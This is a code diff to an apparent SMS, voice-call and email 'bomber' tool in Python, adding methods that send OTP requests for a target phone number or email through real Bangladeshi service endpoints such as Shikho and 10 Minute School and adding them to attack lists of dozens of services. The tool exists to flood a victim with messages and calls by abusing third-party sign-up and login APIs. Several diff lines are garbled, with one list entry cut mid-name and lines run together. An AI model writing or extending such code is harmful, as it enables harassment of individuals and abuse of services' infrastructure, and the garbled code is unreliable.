@@ -3694,6 +3694,54 @@ class AsyncBomber:
             await self.log_event("EMAIL48 - ShanBD Register", False, "Error", api_key="EMAIL48 - ShanBD Register")
             return False
 
+    async def api_api123___shikho_otp_v2(self):
+        target = self.target
+        url = "https://api.shikho.com/v1/auth/send-otp"
+        try:
+            async with self.session.post(url, json={"phone": target, "type": "login"}, headers=self.get_headers(url), timeout=10) as res:
+                success = res.status in [200, 201]
+                await self.log_event("API123 - Shikho OTP V2", success, res.status, api_key="API123 - Shikho OTP V2")
+                return success
+        except Exception:
+            await self.log_event("API123 - Shikho OTP V2", False, "Error", api_key="API123 - Shikho OTP V2")
+            return False
+
+    async def api_api124___10ms_otp(self):
+        target = self.target
+        url = "https://api.10minuteschool.com/v1/auth/send-otp"
+        try:
+            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
+                success = res.status in [200, 201]
+                await self.log_event("API124 - 10MS OTP", success, res.status, api_key="API124 - 10MS OTP")
+                return success
+        except Exception:
+            await self.log_event("API124 - 10MS OTP", False, "Error", api_key="API124 - 10MS OTP")
+            return False
+
+    async def api_call12___shikho_call_otp(self):
+        target = self.target
+        url = "https://api.shikho.com/v1/auth/send-otp"
+        try:
+            async with self.session.post(url, json={"phone": target, "type": "login", "method": "voice"}, headers=self.get_headers(url), timeout=10) as res:
+                success = res.status in [200, 201]
+                await self.log_event("CALL12 - Shikho Call OTP", success, res.status, api_key="CALL12 - Shikho Call OTP")
+                return success
+        except Exception:
+            await self.log_event("CALL12 - Shikho Call OTP", False, "Error", api_key="CALL12 - Shikho Call OTP")
+            return False
+
+    async def api_email51___shikho_email_otp(self):
+        target = self.target
+        url = "https://api.shikho.com/v1/auth/send-otp"
+        try:
+            async with self.session.post(url, json={"email": target, "type": "registration"}, headers=self.get_headers(url), timeout=10) as res:
+                success = res.status in [200, 201]
+                await self.log_event("EMAIL51 - Shikho Email OTP", success, res.status, api_key="EMAIL51 - Shikho Email OTP")
+                return success
+        except Exception:
+            await self.log_event("EMAIL51 - Shikho Email OTP", False, "Error", api_key="EMAIL51 - Shikho Email OTP")
+            return False
+
     async def bomb_task(self):
         if self.mode == 'sms':
             apis = [
@@ -3701,20 +3749,22 @@ class AsyncBomber:
                 self.api_api109___chaldal_otp, self.api_api110___pathao_otp, self.api_api111___sharetrip_otp, self.api_api112___shohoz_otp,
                 self.api_api113___foodpanda_otp, self.api_api114___hungrynaki_otp, self.api_api115___rokomari_otp, self.api_api116___evaly_otp,
                 self.api_api117___amarpay_otp, self.api_api118___pickaboo_otp, self.api_api119___ajkerdeal_otp, self.api_api120___priyoshop_otp,
-                self.api_api121___bikroy_otp_v2, self.api_api122___daraz_otp_v2
+                self.api_api121___bikroy_otp_v2, self.api_api122___daraz_otp_v2,
+                self.api_api123___shikho_otp_v2, self.api_api124___10ms_otp
             ]
         elif self.mode == 'call':
             apis = [
                 self.api_call1___robi_call_otp, self.api_call2___daraz_call_otp, self.api_call3___pathao_call_otp, self.api_call4___shohoz_call_otp,
                 self.api_call5___chaldal_call_otp, self.api_call6___foodpanda_call_otp, self.api_call7___evaly_call_otp, self.api_call8___hungrynaki_call_otp,
-                self.api_call9___rokomari_call_otp, self.api_call10___airtel_call_otp, self.api_call11___gp_call_otp_v2
+                self.api_call9___rokomari_call_otp, self.api_call10___airtel_call_otp, self.api_call11___gp_call_otp_v2,
+                self.api_call12___shikho_call_otp
             ]
         else:
             apis = [
-                self.api_email1___bikroy_account, self.api_email2___bikroy_password_reset, self.api_email3___busbud_signup, self.api_email4___mithaibd_register, self.api_email5___saralifestyle_reset, self.api_email6___tohfay_register, self.api_email7___tohfay_forgot, self.api_email8___mrmedicinemart_signup, self.api_email9___mrmedicinemart_reset, self.api_email10___robishop_create, self.api_email11___robishop_reset, self.api_email12___singerbd_otp, self.api_email13___potakait_register, self.api_email14___electronicsbd_register, self.api_email15___electronicsbd_recovery, self.api_email16___globalbrand_register, self.api_email17___globalbrand_forgot, self.api_email18___zymak_register, self.api_email19___zymak_lost_password, self.api_email20___shopz_register, self.api_email21___shopz_lost_password, self.api_email22___xclusivebrands_register, self.api_email23___xclusivebrands_lost_password, self.api_email24___gamebuybd_register, self.api_email25___gamebuybd_lost_password, self.api_email26___gameforce_register, self.api_email27___gameforce_lost_password, self.api_email28___gamecastlebd_register, self.api_email29___gamecastlebd_lost_password, self.api_email30___techshopbd_signup, self.api_email31___electronicshopbd_ajax_register, self.api_email32___electronicshopbd_lost_password, self.api_email33___makersbd_register, self.api_email34___abe_register, self.api_email35___abe_forget_password, self.api_email36___colorcrazebd_signup, self.api_email37___colorcrazebd_reset, self.api_email38___chowdhuryelectronics_register, self.api_email39___smartview_register, self.api_email40___smartview_verify_resend, self.api_email41___smartview_password_code, self.api_email42___gadstyle_register, self.api_email43___gadstyle_lost_password, self.api_email44___havit_register, self.api_email45___havit_lost_password, self.api_email46___htebd_register, self.api_email47___htebd_lost_password, self.api_email48___shanbd_register, self.api_email49___quora_signup, self.api_email50___pinterest_signup
+                self.api_email1___bikroy_account, self.api_email2___bikroy_password_reset, self.api_email3___busbud_signup, self.api_email4___mithaibd_register, self.api_email5___saralifestyle_reset, self.api_email6___tohfay_register, self.api_email7___tohfay_forgot, self.api_email8___mrmedicinemart_signup, self.api_email9___mrmedicinemart_reset, self.api_email10___robishop_create, self.api_email11___robishop_reset, self.api_email12___singerbd_otp, self.api_email13___potakait_register, self.api_email14___electronicsbd_register, self.api_email15___electronicsbd_recovery, self.api_email16___globalbrand_register, self.api_email17___globalbrand_forgot, self.api_email18___zymak_register, self.api_email19___zymak_lost_password, self.api_email20___shopz_register, self.api_email21___shopz_lost_password, self.api_email22___xclusivebrands_register, self.api_email23___xclusivebrands_lost_password, self.api_email24___gamebuybd_register, self.api_email25___gamebuybd_lost_password, self.api_email26___gameforce_register, self.api_email27___gameforce_lost_password, self.api_email28___gamecastlebd_register, self.api_email29___gamecastlebd_lost_password, self.api_email30___techshopbd_signup, self.api_email31___electronicshopbd_ajax_register, self.api_email32___electronicshopbd_lost_password, self.api_email33___makersbd_register, self.api_email34___abe_register, self.api_email35___abe_forget_password, self.api_email36___colorcrazebd_signup, self.api_email37___colorcrazebd_reset, self.api_email38___chowdhuryelectronics_register, self.api_email39___smartview_register, self.api_email40___smartview_verify_resend, self.api_email41___smartview_password_code, self.api_email42___gadstyle_register, self.api_email43___gadstyle_lost_password, self.api_email44___havit_register, self.api_email45___havit_lost_pa                self.api_email46___htebd_register, self.api_email47___htebd_lost_password, self.api_email48___shanbd_register, self.api_email49___quora_signup, self.api_email50___pinterest_signup,
+                self.api_email51___shikho_email_otp
             ]
-        while self.running and not self.stop_event.is_set():
-            if self.limit != 0 and self.sent >= self.limit:
+        while self.running and not self.stop_event.is_set():     if self.limit != 0 and self.sent >= self.limit:
                 self.running = False
                 break
 
